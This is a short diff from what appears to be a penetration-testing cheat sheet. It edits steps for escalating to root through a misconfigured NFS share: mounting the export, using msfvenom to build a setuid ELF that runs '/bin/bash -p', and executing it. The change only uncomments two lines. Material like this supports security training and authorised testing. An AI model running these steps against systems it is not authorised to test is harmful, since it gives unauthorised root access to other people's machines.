@@ -526,8 +526,8 @@ $ export –f /usr/sbin/service
 				- $ showmount -e $IP
 				- mkdir /tmp/nfs
 				- mount -o rw,vers=2 $IP:/tmp /tmp/nfs
-				- # msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
-				- # chmod +xs /tmp/nfs/shell.elf
+				- msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+				- chmod +xs /tmp/nfs/shell.elf
 				- $ /tmp/shell.elf
 
 - Common Exploits
